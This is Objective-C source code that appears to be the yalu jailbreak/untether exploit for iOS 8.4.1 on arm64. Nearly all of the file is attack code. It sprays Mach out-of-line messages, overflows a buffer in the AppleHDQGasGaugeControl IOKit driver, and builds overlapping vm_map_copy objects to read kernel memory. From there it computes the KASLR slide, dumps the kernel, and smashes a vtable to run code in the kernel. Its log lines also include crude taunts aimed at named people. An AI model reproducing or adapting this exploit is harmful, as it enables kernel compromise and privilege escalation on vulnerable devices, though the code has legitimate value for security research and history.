#include "patchfinder_64.h"
#include <Foundation/Foundation.h>
#import "xnuexp.h"
#import <mach/mach_time.h>
#import <sys/syscall.h>

static char pad[0x10000];
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;


static void deallocateFast(mach_port_t ref) {
    mach_port_deallocate(mach_task_self_, ref);
}
static char* copyoutDataFast(mach_port_t ref) {
    char msgs[sizeof(oolmsg_t)+0x2000];
    oolmsg_t *msg=(void*)&msgs[0];
    bzero(msg,sizeof(oolmsg_t)+0x2000);
    if(MACH_MSG_SUCCESS == mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, ref, 0, MACH_PORT_NULL))
        return msg->desc.address;
    return NULL;
}
static mach_port_t copyinDataFast(char* bytes, size_t size) {
    char msgs[sizeof(oolmsg_t)+0x2000];
    mach_port_t ref = 0;
    mach_port_t* msgp = &ref;
    oolmsg_t *msg=(void*)&msgs[0];
    if(!*msgp){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, msgp);
        mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
    }
    bzero(msg,sizeof(oolmsg_t));
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_remote_port = *msgp;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    msg->desc.address = (void *)bytes;
    msg->desc.size = size;
    msg->desc.type = MACH_MSG_OOL_DESCRIPTOR;
    mach_msg_return_t m = mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    return ref;
}

void hexdump(unsigned char* ptr, size_t sz) {
    for (int i = 0; i < sz; i+=16) {
        NSLog(@"%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n", ptr[i], ptr[i+1], ptr[i+2], ptr[i+3], ptr[i+4], ptr[i+5], ptr[i+6], ptr[i+7], ptr[i+8], ptr[i+9], ptr[i+10], ptr[i+11], ptr[i+12], ptr[i+13], ptr[i+14], ptr[i+15]);
    }
}
int main(int argc, char** argv) {
    
    //
    
    NSLog(@"Smoke Britta Erry Day");
    NSLog(@"yalu for ios841 arm64 untether by ~qwertyoruiop[kjc]");
    NSLog(@"+420 swags @ windknown, comex, ih8sn0w, posixninja, _morpheus_, haifisch, jk9357, ttwj, kim jong un");
    NSLog(@"-420 swags @ south (fake) korea, saurik, britta");
    sleep(1);
    sync();
    
    kern_return_t err;
    io_iterator_t iterator;
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleHDQGasGaugeControl"), &iterator);
    io_service_t gg = IOIteratorNext(iterator);
    io_connect_t conn;
    err = IOServiceOpen(gg, mach_task_self(), 0, &conn);
    assert(err == KERN_SUCCESS);
    
    mach_port_t spray[700];
    
    for (int i = 0; i < 700; i++) {
        spray[i] = copyinDataFast(pad, 1024 - 0x58);
    }
    
    
    uint64_t inputScalar = 0;
    char oflow_data[1024+0x100];
    
#define kern_uint_t uint64_t
    
#pragma pack(4)
    struct vm_map_copy {
        kern_uint_t type;
        kern_uint_t obj;
        kern_uint_t sz;
        kern_uint_t ptr;
        kern_uint_t kfree_size;
    } *oflow_msg = (struct vm_map_copy*) (&oflow_data[1024]);
    
    memset(&oflow_data[0], 0, 1024+0x100);
    for (int i = 0; i < 125; i++) {
        *(uint32_t *)&oflow_data[4 + (i*8)] = 1;
    }
    *(uint32_t *)&oflow_data[4+(120*8)] = 0xFFFFFFFF;  // indicate end

    oflow_msg->type = 3; // type
    oflow_msg->sz = 1024; // size
    oflow_msg->ptr = 0xFFFFFF4141414141;
    oflow_msg->kfree_size = 2048;

    copyoutDataFast(spray[500]);
    spray[500] = 0;
    copyoutDataFast(spray[515]);
    spray[515] = 0;
    copyoutDataFast(spray[530]);
    spray[530] = 0;
    copyoutDataFast(spray[560]);
    spray[560] = 0;
    
    IOConnectCallMethod(conn, 12, &inputScalar, 1, oflow_data, 1024 + 0x100, 0, 0, 0, 0);
    

    mach_port_t overlapping = 0;
    mach_port_t overlapped = 0;
    
    for (int i = 0; i < 700; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                oflow_msg->kfree_size = 1024;
                overlapping  = copyinDataFast(&oflow_data[0x58], 2048 - 0x58);
                deallocateFast(spray[i]);
                spray[i] = 0;
                NSLog(@"Found overlapping object");
                goto outy;
            } else {
                mach_port_t tmp  = copyinDataFast(pad, 1024 - 0x58);
                deallocateFast(spray[i]);
                spray[i] = tmp;
            }
        }
    }
    assert(false);
    outy:
    for (int i = 0; i < 700; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                overlapped  = copyinDataFast(pad, 1024 - 0x58);
                NSLog(@"Found overlapped object");
            }
            deallocateFast(spray[i]);
            spray[i] = 0;
        }
    }
    assert(overlapped);
    char buf[4096];
    bzero(buf, 4096);
    
#define ReadToBuf() {\
char* cpy = copyoutDataFast(overlapping);\
mach_port_t tmp = copyinDataFast(cpy, 2048 - 0x58);\
memcpy(buf, cpy, 2048);\
deallocateFast(overlapping);\
overlapping = tmp;\
}
    
#define WriteFromBuf()  {\
char* cpy = copyoutDataFast(overlapping);\
mach_port_t tmp = copyinDataFast(buf, 2048 - 0x58);\
deallocateFast(overlapping);\
overlapping = tmp;\
}
    
#define SendOverlapped() {\
overlapped = copyinDataFast(pad, 1024 - 0x58);\
}
    
#define ReadOverlapped() copyoutDataFast(overlapped);


    ReadToBuf();
    ReadToBuf();
    
    uint64_t kernalloc = 0;
    struct vm_map_copy* vmcopy = (struct vm_map_copy*) &buf[1024 - 0x58];
    kernalloc = vmcopy->ptr - 0x58;
    vmcopy->kfree_size = 512;
    
    WriteFromBuf();
    ReadOverlapped();
    
    io_connect_t conn_;
    err = IOServiceOpen(gg, mach_task_self(), 0, &conn_);
    assert(err == KERN_SUCCESS);

    ReadToBuf();
    
    uint64_t vtptr = vmcopy->type;
    
    IOServiceClose(conn_);
    
    mach_timespec_t wt;
    wt.tv_nsec = 10000;
    wt.tv_sec = 1;
    
    for (int i = 0; i < 100; i++) {
        spray[i] = copyinDataFast(pad, 512 - 0x58);
        if (i % 10 == 0) {
            wt.tv_nsec = 10000;
            wt.tv_sec = 1;
            IOServiceWaitQuiet(gg, &wt);
        }
    }
    
    ReadToBuf();
    
    vmcopy->ptr = 0xFFFFFF4141414141;
    
    WriteFromBuf();
    
    for (int i = 0; i < 100; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                overlapped  = copyinDataFast(pad, 512 - 0x58);
                NSLog(@"Found overlapped object again");
            }
            deallocateFast(spray[i]);
            spray[i] = 0;
        }
    }
    
    ReadToBuf();
    
    vmcopy->ptr = vtptr;
    vmcopy->sz = 4096;
    vmcopy->kfree_size = 1024;
    
    WriteFromBuf();
    
    uint64_t* vtdump = (uint64_t*) ReadOverlapped();
    SendOverlapped();
    
    uint64_t far = 0;
    
    for (int i = 0; i < 30; i++) {
        if (vtdump[i] > 0xffffff8000000000 && 0xffffff9000000000 > vtdump [i] && (far == 0 || vtdump[i] < far)) {
            far = vtdump[i];
        }
    }
    
    far -= 0xffffff8002002000;
    far &= ~0xFFFFF;
    far -= 0x300000;
    uint64_t kaslr_slide = far;

    NSLog(@"Beginning kernel dump..");
    char* kern_dump = calloc(256, 0x10000);
    for (int i = 0; i < 256; i++) {
        ReadToBuf();
        vmcopy->sz = 0x10000;
        vmcopy->ptr = 0xffffff8002002000 + kaslr_slide + i*vmcopy->sz;
        WriteFromBuf();
        
        char* data = ReadOverlapped();
        SendOverlapped();
        if (!data) {
            usleep(400);
            continue;
        }
        memcpy(&kern_dump[i*vmcopy->sz], data, vmcopy->sz);
        usleep(200);
    }
    
    NSLog(@"Kernel dumped.");
    
    sleep(1);
    
    ReadToBuf();
    vmcopy->kfree_size = 512;
    WriteFromBuf();
    ReadOverlapped();

    err = IOServiceOpen(gg, mach_task_self(), 0, &conn_);
    assert(err == KERN_SUCCESS);
    
    ReadToBuf();
    memcpy(&buf[2048], &buf[0], 2048);
    memcpy(&buf[0], vtdump, 2048);
    memcpy(&buf[1024 - 0x58], &buf[2048 + 1024 - 0x58], 32);

    vmcopy->type = kernalloc - 1024 + 0x58;
    WriteFromBuf();
    
    /* smashed vtable! */
    IOConnectTrap3(conn_, 0x13371337, 0x41414141, 0x42424242, 0x43434343);
    
    memcpy(&buf[0], &buf[2048], 2048);
    WriteFromBuf();

    ReadToBuf();
    
    IOServiceClose(conn_);
    
    wt.tv_nsec = 10000;
    wt.tv_sec = 1;
    
    for (int i = 0; i < 100; i++) {
        spray[i] = copyinDataFast(pad, 512 - 0x58);
        if (i % 10 == 0) {
            wt.tv_nsec = 10000;
            wt.tv_sec = 1;
            IOServiceWaitQuiet(gg, &wt);
        }
    }
    
    ReadToBuf();
    
    vmcopy->kfree_size = 1024;
    vmcopy->ptr = 0xFFFFFF4141414141;
    
    WriteFromBuf();
    
    for (int i = 0; i < 100; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                overlapped  = copyinDataFast(pad, 1024 - 0x58);
                NSLog(@"Found overlapped object again");
            }
            deallocateFast(spray[i]);
            spray[i] = 0;
        }
    }
    
    NSLog(@"Clean");
    ReadToBuf();
    vmcopy->kfree_size = 0xFFFFFFF0;
    WriteFromBuf();
    
    ReadOverlapped();
    
    exit(0);
    
}